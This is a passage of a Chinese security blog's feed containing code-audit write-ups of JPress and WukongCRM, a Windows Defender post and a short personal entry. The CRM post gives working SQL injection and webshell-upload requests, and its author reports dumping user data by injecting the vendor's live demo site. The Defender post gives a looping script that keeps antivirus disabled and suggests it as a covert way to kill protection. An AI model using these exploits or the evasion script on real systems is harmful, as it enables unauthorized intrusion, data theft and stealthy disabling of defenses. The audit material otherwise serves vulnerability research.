alt="image-20221227160017106"></p><p>同样的方式，我们测试下，在最新版（截止到2022/12/27，最新版为5.0.5）中，此方法是否可以getshell，同样的过程搭建一下jpress最新版，搭建好后进入后台，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227170402762.png" alt="image-20221227170402762"></p><p>上传刚才打包好的jar包，点击插件测试，看到可成功执行命令，弹出计算器</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227170736878.png" alt="image-20221227170736878"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-目标熟悉&quot;&gt;&lt;a href=&quot;#0x01-目标熟悉&quot; class=&quot;headerlink&quot; title=&quot;0x01 目标熟悉&quot;&gt;&lt;/a&gt;0x01 目标熟悉&lt;/h1&gt;&lt;p&gt;JPress 是一个使用 Java 开发的、开源免费的建站神器，灵感来源于 Word</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>悟空CRM审计</title>
    <link href="http://example.com/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/</id>
    <published>2024-04-19T01:17:45.000Z</published>
    <updated>2024-04-19T01:38:33.523Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-目标熟悉"><a href="#0x01-目标熟悉" class="headerlink" title="0x01 目标熟悉"></a>0x01 目标熟悉</h1><p>CRM：客户关系管理系统</p><p>官方地址：<a href="https://www.5kcrm.com/">https://www.5kcrm.com/</a></p><p>源码下载地址：<a href="https://gitee.com/wukongcrm">https://gitee.com/wukongcrm</a></p><p>可以看到共有5类，分别是：基于Spring Cloud Alibaba微服务框架、基于jfinal框架、基于TP5.0框架，以及php和java的前端</p><p>这里我们审计的是基于TP5.0框架的版本：<a href="https://gitee.com/wukongcrm/crm_php">https://gitee.com/wukongcrm/crm_php</a></p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>参考官方文档：<a href="https://gitee.com/wukongcrm/crm_php">https://gitee.com/wukongcrm/crm_php</a></p><p>老样子，环境使用windows + phpstudy，将下载后的项目放到phpstudy对应的web目录下，一路下一步即可</p><p>有一个地方需要注意：</p><p>1、悟空crm需要用到redis，所以php需要配置redis扩展，以及需要安装redis服务端，可参考文章：<a href="http://www.wjhsh.net/lyzaidxh-p-11458909.html">http://www.wjhsh.net/lyzaidxh-p-11458909.html</a></p><p>安装时发现悟空crm要求php最低版本7.0，之前用的5.6，又要重新配置一下</p><p>安装时会要求输入序列号，序列号在官方文档中给出了，其他信息如下：</p><p>数据库名：5kcrm，数据库密码：root，管理员账号：13788889999，管理员密码：admin888</p><p>安装好后，如下图</p><p><img src="/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/image-20221216000144145.png" alt="image-20221216000144145"></p><p>但是在登录的时候，会提示“网络错误 请检查你的网络”</p><p>各种谷歌搜索，尝试过导入public/sql/5kcrm.sql，但是admin_user中没有用户，依旧登录不上</p><p>利用后台注入，对官网的demo站进行sql注入，时间盲注有点慢，耐心等待后，拿到用户表中的数据，最后，依照5kcrm.sql中的表结构，挨个字段构造数据，再次尝试登录发现可成功登录</p><p><img src="/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/image-20221216164651698.png" alt="image-20221216164651698"></p><h1 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h1><h2 id="01-后台注入"><a href="#01-后台注入" class="headerlink" title="01 后台注入"></a>01 后台注入</h2><p>时间有限，先不去分析路由、鉴权，后台挂着xray，访问各个接口，经过大量测试，在如下接口发现一处sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php/work/task/dateList HTTP/1.1</span><br><span class="line">Host: demo11.5kcrm.net</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Sleipnir6/6.4.4; SleipnirSiteUpdates/6.4.4)</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">authKey: 22d8da8ce545a6e19a321f8a716bfda6</span><br><span class="line">sessionId: b7i69u3nlkf6835up2lmbidndb</span><br><span class="line">Content-Length: 37</span><br><span class="line">Origin: http://demo11.5kcrm.net</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://demo11.5kcrm.net/</span><br><span class="line">Cookie: PHPSESSID=b7i69u3nlkf6835up2lmbidndb</span><br><span class="line"></span><br><span class="line">&#123;&quot;start_time&quot;:&quot;123&quot;,&quot;stop_time&quot;:&quot;12&quot;&#125;</span><br></pre></td></tr></table></figure><p>sqlmap验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.exe .\sqlmapproject-sqlmap-1.6.10\sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure><p>有漏洞，如下图</p><p><img src="/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/image-20221216124452098.png" alt="image-20221216124452098"></p><p>可爆出数据，如下图</p><p><img src="/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/image-20221216153510522.png" alt="image-20221216153510522"></p><p>代码中的加密方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 用户密码加密方法</span><br><span class="line"> * @param string $str 加密的字符串</span><br><span class="line"> * @param  [type] $auth_key 加密符</span><br><span class="line"> * @param  [string] $username 用户名</span><br><span class="line"> * @return string           加密后长度为32的字符串</span><br><span class="line"> */</span><br><span class="line">function user_md5($str, $auth_key = &#x27;&#x27;, $username = &#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;&#x27; === $str ? &#x27;&#x27; : md5(sha1($str) . md5($str . $auth_key));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (user_md5($param[&#x27;new_pwd&#x27;], $userInfo[&#x27;salt&#x27;], $userInfo[&#x27;username&#x27;]) == $userInfo[&#x27;password&#x27;]) &#123;</span><br><span class="line">    $this-&gt;error = &#x27;密码没改变&#x27;;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如帐号：18888888888密码：123456a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo md5(sha1(&quot;123456a&quot;) . md5(&quot;123456a&quot; . &quot;48be&quot;));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (&quot;860a39355e1e4d1818144ac13bfc964f&quot; == &quot;860a39355e1e4d1818144ac13bfc964f&quot;) &#123;</span><br><span class="line">    echo &quot;yes, it&#x27;s same&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;no, it&#x27;s not same&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试后发现和爆出来的hash一样</p><p>但是cmd5中没有针对此方式的解密，现在的利用思路只能是本地跑或者用来update数据库中password字段的值</p><h2 id="02-后台上传"><a href="#02-后台上传" class="headerlink" title="02 后台上传"></a>02 后台上传</h2><p>常规的测一下头像上传功能，修改后缀和内容，不出意外返回500，意外的是文件传上去了，不过名字是随机的</p><p>如下数据包是管理员头像上传处抓的数据包，方便起见，可替换authKey和sessionId后，直接发送如下数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /crm_php-master/index.php/admin/users/updateImg HTTP/1.1</span><br><span class="line">Host: 10.211.55.3</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Sleipnir6/6.4.4; SleipnirSiteUpdates/6.4.4)</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">authKey: 59243dc2a1b709a047ee85c3106f38b0</span><br><span class="line">sessionId: 0snel6vf6hlt7nl8as1lar6q31</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------25781395022072740844187142620</span><br><span class="line">Content-Length: 341</span><br><span class="line">Origin: http://10.211.55.3</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.211.55.3/crm_php-master/index.html</span><br><span class="line">Cookie: PHPSESSID=0snel6vf6hlt7nl8as1lar6q31</span><br><span class="line"></span><br><span class="line">-----------------------------25781395022072740844187142620</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------25781395022072740844187142620</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">-----------------------------25781395022072740844187142620--</span><br></pre></td></tr></table></figure><p>访问后如下图</p><p><img src="/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/image-20221216220559395.png" alt="image-20221216220559395"></p><p>现在的问题是如何获取文件名，查看相关代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$savename = date(&#x27;Ymd&#x27;) . DS . md5(microtime(true));</span><br><span class="line"></span><br><span class="line">20221216DS77f39cc096d7e05ab87e1171aa5ae4c0</span><br></pre></td></tr></table></figure><p>可以知道文件名是如下代码生成的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(microtime(true))</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">microtime(true)</span><br><span class="line"></span><br><span class="line">1671199810.2335</span><br></pre></td></tr></table></figure><p>也就是说每一秒有1万种可能，我们自己构造时间戳的话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo strtotime(&quot;2022-12-16 17:47:20&quot;);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo strtotime(&quot;2022-12-16 17:47:22&quot;);</span><br><span class="line"></span><br><span class="line">1671184040</span><br><span class="line">1671184042</span><br></pre></td></tr></table></figure><p>我们可以这样，将数据包发送到repeater中，看着时间，点击发送，如下图</p><p><img src="/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/image-20221216222156797.png" alt="image-20221216222156797"></p><p>比如我们在2022-12-16 22:22:30点击发送，对应的时间戳是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo strtotime(&quot;2022-12-16 22:22:30&quot;);</span><br><span class="line"></span><br><span class="line">1671200550</span><br></pre></td></tr></table></figure><p>编写python脚本，构造小数点后4位，实际测试中发现，几乎不会有.0xxx系列的时间戳，所以可以去掉.0xxx，这样就减少1000个，可以看到如下这个文件名就是我们要找的webshell</p><p><img src="/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/image-20221216223646577.png" alt="image-20221216223646577"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-目标熟悉&quot;&gt;&lt;a href=&quot;#0x01-目标熟悉&quot; class=&quot;headerlink&quot; title=&quot;0x01 目标熟悉&quot;&gt;&lt;/a&gt;0x01 目标熟悉&lt;/h1&gt;&lt;p&gt;CRM：客户关系管理系统&lt;/p&gt;
&lt;p&gt;官方地址：&lt;a href=&quot;https://</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>解决Windows Defender关闭后又自动打开的困扰（隐蔽的关闭杀软方式？）</title>
    <link href="http://example.com/2024/02/03/%E8%A7%A3%E5%86%B3Windows-Defender%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%88%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%9A%84%E5%9B%B0%E6%89%B0/"/>
    <id>http://example.com/2024/02/03/%E8%A7%A3%E5%86%B3Windows-Defender%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%88%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%9A%84%E5%9B%B0%E6%89%B0/</id>
    <published>2024-02-03T02:56:48.000Z</published>
    <updated>2024-04-16T08:05:54.918Z</updated>
    
    <content type="html"><![CDATA[<p>有这样一个需求，我有一台Win10系统用作服务器跑程序，但不想装杀软，可是Win10系统不装杀软的话就会自动开启Defender，之前的笔记中记载，执行如下2步可关闭Windows Defender</p><span id="more"></span><p>01 关闭篡改防护</p><p>02 修改注册表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender</span><br><span class="line">New-&gt;DWORD (32-bit) Value</span><br><span class="line">DisableAntiSpyware</span><br><span class="line">1（十进制下）</span><br></pre></td></tr></table></figure><p>结果在使用中发现，过一会Windows又会将注册表改回去，这让我想到，是不是可以写一个程序来持续监测注册表，当发现Windows将它改回来后再改回去</p><h1 id="注册表操作学习"><a href="#注册表操作学习" class="headerlink" title="注册表操作学习"></a>注册表操作学习</h1><p>这里选择我比较熟悉的语言python，python操作注册表官方推荐的库是winreg，官方文档在这里：<a href="https://docs.python.org/3.8/library/winreg.html#module-winreg">https://docs.python.org/3.8/library/winreg.html#module-winreg</a>，具体函数用法官方文档写的很详细，我就不赘述了，这里主要记录下学习这些函数过程中遇到的坑</p><p>模块winreg中共包含18个操作注册表的函数，分别如下：<br>关闭键、连接注册表、创建键、删除键、删除值、枚举键、枚举值、扩展环境字符串、刷新键、载入键、打开键、查询键信息、查询值、保存键、设置值、关闭反射键、开启反射键、查询反射键</p><h2 id="注册表中的一些概念"><a href="#注册表中的一些概念" class="headerlink" title="注册表中的一些概念"></a>注册表中的一些概念</h2><p>需要先明确一下注册表中的一些概念，否则后面看文档时会混乱搞不清楚</p><p>注册表左边的通常称为键、子健 或 项、子项<br>注册表右边的通常称为值，包含：值名称、值类型、值数据<br>如下图</p><p><img src="/2024/02/03/%E8%A7%A3%E5%86%B3Windows-Defender%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%88%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%9A%84%E5%9B%B0%E6%89%B0/01.png" alt="image"></p><h2 id="OpenKey、OpenKeyEx（打开键）"><a href="#OpenKey、OpenKeyEx（打开键）" class="headerlink" title="OpenKey、OpenKeyEx（打开键）"></a>OpenKey、OpenKeyEx（打开键）</h2><p>其中OpenKeyEx是OpenKey的扩展版本，也就是加强版本</p><p>函数原型 -&gt; winreg.OpenKeyEx(key, sub_key, reserved=0, access=KEY_READ)</p><p>官方文档中有1个坑</p><p>第4个参数的介绍是：”access is an integer that specifies an access mask that describes the desired security access for the key. Default is KEY_READ. See Access Rights for other allowed values.”，没用过这个函数的人，看到这个介绍，会觉得值应该是整数，尝试后发现不是，然后尝试 KEY_READ 发现也不是，最后经过尝试发现是winreg.KEY_ALL_ACCESS</p><p>另外需要注意，第4个参数如果设置不正确，后面写入值的时候，会报错提示权限问题，其中winreg.KEY_ALL_ACCESS是权限最大的，直接设置为它就可以</p><h2 id="SetValue、SetValueEx（设置值）"><a href="#SetValue、SetValueEx（设置值）" class="headerlink" title="SetValue、SetValueEx（设置值）"></a>SetValue、SetValueEx（设置值）</h2><p>其中SetValueEx是SetValue的扩展版本，也就是加强版本</p><p>函数原型 -&gt; winreg.SetValueEx(key, value_name, reserved, type, value)</p><p>官方文档有2个坑</p><p>第1个坑是第2个参数，介绍是：”alue_name is a string that names the subkey with which the value is associated.”，翻译过来这个参数应该是子健的名字，但其实它应该是值名称，对应上面注册表的概念</p><p>第2个坑是第4个参数，介绍是：”type is an integer that specifies the type of the data. See Value Types for the available types.”，跟OpenKeyEx中的坑类似，值不是整数，是winreg.REG_DWORD</p><p>另外，关于第4个参数，一开始我没发现怎么用的时候，用到了一个小技巧，先手动设置注册表的值，然后使用winreg.QueryValueEx读取对应的值，可获取值数据和值类型</p><h2 id="UAC问题"><a href="#UAC问题" class="headerlink" title="UAC问题"></a>UAC问题</h2><p>操作注册表需要过UAC，python中可通过库elevate请求获取UAC权限，用法很简单如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from elevate import elevate</span><br><span class="line"></span><br><span class="line">elevate()</span><br></pre></td></tr></table></figure><p>elevate()之后的代码都是过UAC后的权限</p><h1 id="完整源码"><a href="#完整源码" class="headerlink" title="完整源码"></a>完整源码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import winreg</span><br><span class="line">from elevate import elevate</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">elevate()</span><br><span class="line">while True:</span><br><span class="line">    key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, &quot;SOFTWARE\Policies\Microsoft\Windows Defender&quot;, 0, winreg.KEY_ALL_ACCESS)</span><br><span class="line">    try:</span><br><span class="line">        value, type = winreg.QueryValueEx(key, &quot;DisableAntiSpyware&quot;)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;注册表项 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender 不包含值 DisableAntiSpyware，正在添加...&quot;)</span><br><span class="line">        winreg.SetValueEx(key, &quot;DisableAntiSpyware&quot;, 0, winreg.REG_DWORD, 1)</span><br><span class="line">        print(&quot;成功添加值 DisableAntiSpyware&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;注册表项 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender 包含值 DisableAntiSpyware，且值数据为&#123;&#125;，值类型为&#123;&#125;&quot;.format(value, str(type)))</span><br><span class="line">    time.sleep(3)</span><br></pre></td></tr></table></figure><p>使用pyinstaller将上述源码打包成exe后，拷贝到目标服务器上，执行后过一会可看到Defender已经关闭，如下图</p><p><img src="/2024/02/03/%E8%A7%A3%E5%86%B3Windows-Defender%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%88%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%9A%84%E5%9B%B0%E6%89%B0/02.png" alt="image"></p><h1 id="引申思考"><a href="#引申思考" class="headerlink" title="引申思考"></a>引申思考</h1><p>上图中可看到，Defender托盘图标没有变化，但防病毒功能已经关闭了，由此联想，是否可以作为一种隐蔽的关闭杀软的方式</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;有这样一个需求，我有一台Win10系统用作服务器跑程序，但不想装杀软，可是Win10系统不装杀软的话就会自动开启Defender，之前的笔记中记载，执行如下2步可关闭Windows Defender&lt;/p&gt;</summary>
    
    
    
    
    <category term="Problem Solving" scheme="http://example.com/tags/Problem-Solving/"/>
    
  </entry>
  
  <entry>
    <title>新征程</title>
    <link href="http://example.com/2022/01/11/%E6%96%B0%E5%BE%81%E7%A8%8B/"/>
    <id>http://example.com/2022/01/11/%E6%96%B0%E5%BE%81%E7%A8%8B/</id>
    <published>2022-01-11T11:34:25.000Z</published>
    <updated>2024-04-16T08:15:52.758Z</updated>
    
    <content type="html"><![CDATA[<p>这是博客从谷歌云搬到新家（Github Pages）的第一篇，也是2022年的第一篇，更是我从长春来到北京入职新公司后的第一篇，一段新的征程，一段新的开始</p><span id="more"></span><p>之前的博客搭建在免费的谷歌云上，不过随着谷歌云的免费到期，付费了一段时间，每月费用实在太高，只得放弃，附一张之前的博客图片</p><p>就像之前第一篇博客中写到：一个热爱黑客的家伙，这里有东西不会让你失望<br><img src="/2022/01/11/%E6%96%B0%E5%BE%81%E7%A8%8B/01.png" alt="image">  </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这是博客从谷歌云搬到新家（Github Pages）的第一篇，也是2022年的第一篇，更是我从长春来到北京入职新公司后的第一篇，一段新的征程，一段新的开始&lt;/p&gt;</summary>
    
    
    
    
    <category term="往事如烟" scheme="http://example.com/tags/%E5%BE%80%E4%BA%8B%E5%A6%82%E7%83%9F/"/>
    
  </entry>
  
</feed>
